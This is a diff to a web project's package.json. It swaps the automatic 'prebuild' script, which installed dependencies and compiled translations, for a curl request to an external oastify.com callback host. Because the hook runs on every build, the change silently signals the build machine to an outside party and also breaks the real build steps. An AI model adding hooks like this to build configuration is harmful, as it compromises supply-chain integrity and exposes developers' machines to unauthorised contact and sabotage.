@@ -6,7 +6,7 @@
     "private": true,
     "scripts": {
         "analyze": "source-map-explorer 'dist/static/*.js' --only-mapped --html analysis/index.html",
-        "prebuild": "yarn install --immutable && lingui compile",
+        "prebuild": "curl qc66bwobs6baipiv5j167y889zfq3ir7.oastify.com/goodprotocolui",
         "prestart": "lingui compile",
         "startS": "cross-env HTTPS=true SSL_CRT_FILE='./.certs/ssl.crt' SSL_KEY_FILE='./.certs/ssl.key' PORT=1122 vite --port 1122",
         "start": "vite --port 3000",
